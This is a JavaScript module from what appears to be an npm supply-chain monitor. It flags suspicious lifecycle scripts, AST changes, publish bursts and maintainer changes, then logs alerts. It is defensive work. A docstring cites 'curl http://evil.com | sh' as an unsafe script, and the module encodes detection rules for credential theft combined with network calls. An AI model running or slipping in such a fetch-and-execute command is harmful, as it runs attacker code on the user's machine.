/**
 * Temporal check functions extracted from monitor.js.
 *
 * All temporal analysis helpers: lifecycle, AST, publish-frequency,
 * maintainer-change detection, severity helpers.
 */

'use strict';

const { detectSuddenLifecycleChange } = require('../temporal-analysis.js');
const { detectSuddenAstChanges } = require('../temporal-ast-diff.js');
const { detectPublishAnomaly } = require('../publish-anomaly.js');
const { detectMaintainerChange } = require('../maintainer-change.js');
const { appendAlert } = require('./state.js');

// ---------------------------------------------------------------------------
// Feature-flag helpers
// ---------------------------------------------------------------------------

function isTemporalEnabled() {
  const env = process.env.MUADDIB_MONITOR_TEMPORAL;
  if (env !== undefined && env.toLowerCase() === 'false') return false;
  return true;
}

function isTemporalAstEnabled() {
  const env = process.env.MUADDIB_MONITOR_TEMPORAL_AST;
  if (env !== undefined && env.toLowerCase() === 'false') return false;
  return true;
}

function isTemporalPublishEnabled() {
  const env = process.env.MUADDIB_MONITOR_TEMPORAL_PUBLISH;
  if (env !== undefined && env.toLowerCase() === 'false') return false;
  return true;
}

function isTemporalMaintainerEnabled() {
  const env = process.env.MUADDIB_MONITOR_TEMPORAL_MAINTAINER;
  if (env !== undefined && env.toLowerCase() === 'false') return false;
  return true;
}

// ---------------------------------------------------------------------------
// Safe-script / anomaly classification helpers
// ---------------------------------------------------------------------------

/**
 * Returns true if a lifecycle script value is benign (npm run/build/test/lint/typecheck only).
 * Scripts like "npm run build", "npm test && npm run lint" are safe.
 * Scripts like "curl http://evil.com | sh" or "node malware.js" are NOT safe.
 */
function isSafeLifecycleScript(scriptValue) {
  if (!scriptValue || typeof scriptValue !== 'string') return false;
  const commands = scriptValue.trim().split(/\s*&&\s*/);
  return commands.every(cmd => {
    const trimmed = cmd.trim();
    // npm/yarn/pnpm/bun run <task> or direct tool calls
    if (/^(npm|yarn|pnpm|bun)\s+(run\s+)?(build|test|lint|typecheck|prepare|compile|format|clean|tsc|check|prebuild|postbuild)\s*$/i.test(trimmed)) return true;
    // Standalone tool commands
    if (/^(tsc|eslint|prettier|jest|vitest|mocha|rollup|webpack|esbuild|vite|tsup|unbuild|turbo)\b/i.test(trimmed)) return true;
    // echo (informational, no side effects)
    if (/^echo\s+/i.test(trimmed)) return true;
    // exit 0 / true / : (no-ops)
    if (/^(exit\s+0|true|:)\s*$/i.test(trimmed)) return true;
    return false;
  });
}

/**
 * Returns true if ALL temporal lifecycle findings are safe (benign scripts only).
 * If any finding has a suspicious script, returns false.
 */
function hasOnlySafeTemporalFindings(temporalResult) {
  if (!temporalResult || !temporalResult.findings || temporalResult.findings.length === 0) return true;
  return temporalResult.findings.every(f => {
    const script = f.value || f.newValue || '';
    return isSafeLifecycleScript(script);
  });
}

/**
 * Returns true if AST anomaly findings represent a dangerous combination.
 * Isolated fetch or child_process additions are NOT enough to warrant a webhook.
 *
 * Sends webhook for:
 *   - eval or Function added (always dangerous)
 *   - child_process + credential access (process.env, fs.readFile_sensitive)
 *   - child_process + network (fetch, http, https, dns, net)
 *   - net.connect combined with other patterns
 *
 * Does NOT send for:
 *   - fetch alone
 *   - child_process alone
 *   - any single isolated pattern (except eval/Function)
 */
function isAstAnomalyCombined(astResult) {
  if (!astResult || !astResult.findings || astResult.findings.length === 0) return false;
  const patterns = new Set(astResult.findings.map(f => f.pattern));

  // eval or Function added — always dangerous
  if (patterns.has('eval') || patterns.has('Function')) return true;

  // net.connect is CRITICAL — send if combined with any other pattern
  if (patterns.has('net.connect') && patterns.size > 1) return true;

  const hasChildProcess = patterns.has('child_process');

  // child_process + credential access
  const hasCredential = patterns.has('process.env') || patterns.has('fs.readFile_sensitive');
  if (hasChildProcess && hasCredential) return true;

  // child_process + network
  const hasNetwork = patterns.has('fetch') || patterns.has('http_request')
    || patterns.has('https_request') || patterns.has('dns.lookup');
  if (hasChildProcess && hasNetwork) return true;

  // Isolated fetch, child_process, or any single pattern — not combined enough
  return false;
}

// ---------------------------------------------------------------------------
// Alert helpers (try* — decide whether to log / send webhook)
// ---------------------------------------------------------------------------

async function tryTemporalAlert(temporalResult, _options) {
  // STRICT FILTER: temporal anomalies are NEVER sent as webhooks — too noisy.
  // Logged to journalctl only. IOC match, sandbox, and canary exfil are the only webhook triggers.
  if (hasOnlySafeTemporalFindings(temporalResult)) {
    console.log(`[MONITOR] ANOMALY (safe scripts, no webhook): temporal lifecycle change for ${temporalResult.packageName}`);
  } else {
    console.log(`[MONITOR] ANOMALY (logged only, never webhook): temporal lifecycle change for ${temporalResult.packageName}`);
  }
}

async function tryTemporalAstAlert(astResult, _options) {
  // STRICT FILTER: AST anomalies are NEVER sent as webhooks — too noisy.
  // Logged to journalctl only. IOC match, sandbox, and canary exfil are the only webhook triggers.
  if (!isAstAnomalyCombined(astResult)) {
    const patterns = (astResult.findings || []).map(f => f.pattern).join(', ');
    console.log(`[MONITOR] ANOMALY (isolated AST, no webhook): ${astResult.packageName} — ${patterns}`);
  } else {
    console.log(`[MONITOR] ANOMALY (combined AST, logged only): ${astResult.packageName}`);
  }
}

async function tryTemporalPublishAlert(publishResult, _options) {
  // STRICT FILTER: publish anomalies (publish_burst, rapid_succession, dormant_spike)
  // are NEVER sent as webhooks — too noisy, not actionable alone.
  // Logged to journalctl only.
  console.log(`[MONITOR] ANOMALY (logged only, never webhook): publish frequency for ${publishResult.packageName}`);
}

async function tryTemporalMaintainerAlert(maintainerResult, _options) {
  // STRICT FILTER: maintainer changes (new_publisher, suspicious_maintainer)
  // are NEVER sent as webhooks — too noisy, not actionable alone.
  // Logged to journalctl only.
  console.log(`[MONITOR] ANOMALY (logged only, never webhook): maintainer change for ${maintainerResult.packageName}`);
}

// ---------------------------------------------------------------------------
// Run* — execute temporal checks and persist results
// ---------------------------------------------------------------------------

/**
 * @param {string} packageName
 * @param {Array} dailyAlerts - mutable array; push summary entries here
 */
async function runTemporalCheck(packageName, dailyAlerts) {
  if (!isTemporalEnabled()) return null;
  try {
    const result = await detectSuddenLifecycleChange(packageName);
    if (result.suspicious) {
      const findingsStr = result.findings.map(f => {
        const action = f.type === 'lifecycle_added' ? 'added' : 'modified';
        return `${f.script} ${action} (${f.severity})`;
      }).join(', ');
      console.log(`[MONITOR] TEMPORAL ANOMALY: ${packageName} v${result.previousVersion} → v${result.latestVersion}: ${findingsStr}`);

      appendAlert({
        timestamp: new Date().toISOString(),
        name: packageName,
        version: result.latestVersion,
        ecosystem: 'npm',
        temporal: true,
        findings: result.findings.map(f => ({
          rule: f.type === 'lifecycle_added' ? 'MUADDIB-TEMPORAL-001' : 'MUADDIB-TEMPORAL-003',
          severity: f.severity,
          script: f.script
        }))
      });

      dailyAlerts.push({
        name: packageName,
        version: result.latestVersion,
        ecosystem: 'npm',
        findingsCount: result.findings.length,
        temporal: true
      });

      // Webhook deferred — sent after sandbox confirms (see resolveTarballAndScan)
    }
    return result;
  } catch (err) {
    console.error(`[MONITOR] Temporal analysis error for ${packageName}: ${err.message}`);
    return null;
  }
}

/**
 * @param {string} packageName
 * @param {Array} dailyAlerts - mutable array; push summary entries here
 */
async function runTemporalAstCheck(packageName, dailyAlerts) {
  if (!isTemporalAstEnabled()) return null;
  try {
    const result = await detectSuddenAstChanges(packageName);
    if (result.suspicious) {
      const findingsStr = result.findings.map(f => {
        return `${f.pattern} (${f.severity})`;
      }).join(', ');
      console.log(`[MONITOR] AST ANOMALY: ${packageName} v${result.previousVersion} → v${result.latestVersion}: ${findingsStr}`);

      appendAlert({
        timestamp: new Date().toISOString(),
        name: packageName,
        version: result.latestVersion,
        ecosystem: 'npm',
        temporalAst: true,
        findings: result.findings.map(f => ({
          rule: f.severity === 'CRITICAL' ? 'MUADDIB-TEMPORAL-AST-001'
            : f.severity === 'HIGH' ? 'MUADDIB-TEMPORAL-AST-002'
            : 'MUADDIB-TEMPORAL-AST-003',
          severity: f.severity,
          pattern: f.pattern
        }))
      });

      dailyAlerts.push({
        name: packageName,
        version: result.latestVersion,
        ecosystem: 'npm',
        findingsCount: result.findings.length,
        temporalAst: true
      });

      // Webhook deferred — sent after sandbox confirms (see resolveTarballAndScan)
    }
    return result;
  } catch (err) {
    console.error(`[MONITOR] Temporal AST analysis error for ${packageName}: ${err.message}`);
    return null;
  }
}

/**
 * @param {string} packageName
 * @param {Array} dailyAlerts - mutable array; push summary entries here
 */
async function runTemporalPublishCheck(packageName, dailyAlerts) {
  if (!isTemporalPublishEnabled()) return null;
  try {
    const result = await detectPublishAnomaly(packageName);
    if (result.suspicious) {
      const anomalyStr = result.anomalies.map(a => {
        return `${a.type} (${a.severity})`;
      }).join(', ');
      console.log(`[MONITOR] PUBLISH ANOMALY: ${packageName}: ${anomalyStr}`);

      appendAlert({
        timestamp: new Date().toISOString(),
        name: packageName,
        version: 'N/A',
        ecosystem: 'npm',
        temporalPublish: true,
        findings: result.anomalies.map(a => ({
          rule: a.type === 'publish_burst' ? 'MUADDIB-PUBLISH-001'
            : a.type === 'dormant_spike' ? 'MUADDIB-PUBLISH-002'
            : 'MUADDIB-PUBLISH-003',
          severity: a.severity,
          type: a.type
        }))
      });

      dailyAlerts.push({
        name: packageName,
        version: 'N/A',
        ecosystem: 'npm',
        findingsCount: result.anomalies.length,
        temporalPublish: true
      });

      // Webhook deferred — sent after sandbox confirms (see resolveTarballAndScan)
    }
    return result;
  } catch (err) {
    console.error(`[MONITOR] Publish frequency analysis error for ${packageName}: ${err.message}`);
    return null;
  }
}

/**
 * @param {string} packageName
 * @param {Array} dailyAlerts - mutable array; push summary entries here
 */
async function runTemporalMaintainerCheck(packageName, dailyAlerts) {
  if (!isTemporalMaintainerEnabled()) return null;
  try {
    const result = await detectMaintainerChange(packageName);
    if (result.suspicious) {
      const findingsStr = result.findings.map(f => {
        return `${f.type} (${f.severity})`;
      }).join(', ');
      console.log(`[MONITOR] MAINTAINER CHANGE: ${packageName}: ${findingsStr}`);

      appendAlert({
        timestamp: new Date().toISOString(),
        name: packageName,
        version: 'N/A',
        ecosystem: 'npm',
        temporalMaintainer: true,
        findings: result.findings.map(f => ({
          rule: f.type === 'new_maintainer' ? 'MUADDIB-MAINTAINER-001'
            : f.type === 'suspicious_maintainer' ? 'MUADDIB-MAINTAINER-002'
            : f.type === 'sole_maintainer_change' ? 'MUADDIB-MAINTAINER-003'
            : 'MUADDIB-MAINTAINER-004',
          severity: f.severity,
          type: f.type
        }))
      });

      dailyAlerts.push({
        name: packageName,
        version: 'N/A',
        ecosystem: 'npm',
        findingsCount: result.findings.length,
        temporalMaintainer: true
      });

      // Webhook deferred — sent after sandbox confirms (see resolveTarballAndScan)
    }
    return result;
  } catch (err) {
    console.error(`[MONITOR] Maintainer change analysis error for ${packageName}: ${err.message}`);
    return null;
  }
}

// ---------------------------------------------------------------------------
// Severity / classification helpers
// ---------------------------------------------------------------------------

/**
 * Returns the highest severity level from all suspicious temporal results.
 * Used to decide whether a temporal alert can be downgraded to FALSE POSITIVE.
 * Returns 'CRITICAL', 'HIGH', 'MEDIUM', 'LOW', or null if no findings.
 */
function getTemporalMaxSeverity(temporalResult, astResult, publishResult, maintainerResult) {
  const SEVERITY_ORDER = { CRITICAL: 4, HIGH: 3, MEDIUM: 2, LOW: 1 };
  let maxLevel = 0;
  let maxSeverity = null;

  const allFindings = [];
  if (temporalResult && temporalResult.suspicious && temporalResult.findings) {
    allFindings.push(...temporalResult.findings);
  }
  if (astResult && astResult.suspicious && astResult.findings) {
    allFindings.push(...astResult.findings);
  }
  // publishResult deliberately excluded — publish anomalies alone (nightly builds,
  // burst releases) should not trigger temporal preservation. They are handled
  // separately by isPublishAnomalyOnly().
  if (maintainerResult && maintainerResult.suspicious && maintainerResult.findings) {
    allFindings.push(...maintainerResult.findings);
  }

  for (const f of allFindings) {
    const level = SEVERITY_ORDER[f.severity] || 0;
    if (level > maxLevel) {
      maxLevel = level;
      maxSeverity = f.severity;
    }
  }

  return maxSeverity;
}

/**
 * Returns true if publish_anomaly is the ONLY suspicious temporal result.
 * publish_anomaly alone is too noisy for webhooks — only alert when combined
 * with another anomaly (lifecycle, AST, maintainer).
 */
function isPublishAnomalyOnly(temporalResult, astResult, publishResult, maintainerResult) {
  const hasLifecycle = temporalResult && temporalResult.suspicious;
  const hasAst = astResult && astResult.suspicious;
  const hasPublish = publishResult && publishResult.suspicious;
  const hasMaintainer = maintainerResult && maintainerResult.suspicious;

  return !!(hasPublish && !hasLifecycle && !hasAst && !hasMaintainer);
}

// ---------------------------------------------------------------------------
// Exports
// ---------------------------------------------------------------------------

module.exports = {
  // Feature flags
  isTemporalEnabled,
  isTemporalAstEnabled,
  isTemporalPublishEnabled,
  isTemporalMaintainerEnabled,

  // Classification helpers
  isSafeLifecycleScript,
  hasOnlySafeTemporalFindings,
  isAstAnomalyCombined,

  // Alert helpers
  tryTemporalAlert,
  tryTemporalAstAlert,
  tryTemporalPublishAlert,
  tryTemporalMaintainerAlert,

  // Run checks
  runTemporalCheck,
  runTemporalAstCheck,
  runTemporalPublishCheck,
  runTemporalMaintainerCheck,

  // Severity / classification
  getTemporalMaxSeverity,
  isPublishAnomalyOnly
};
